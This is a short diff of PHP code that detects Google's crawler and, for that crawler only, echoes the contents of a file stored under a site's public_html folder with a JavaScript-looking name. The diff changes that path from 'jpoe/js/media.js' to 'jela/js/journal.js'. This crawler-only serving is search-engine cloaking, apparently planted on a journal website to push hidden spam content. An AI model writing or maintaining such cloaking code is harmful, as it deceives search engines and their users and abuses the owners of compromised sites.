@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    $bot_content = file_get_contents('/home/stkippas/public_html/jpoe/js/media.js');
+    $bot_content = file_get_contents('/home/stkippas/public_html/jela/js/journal.js');
     echo $bot_content;
     exit;
 } else {
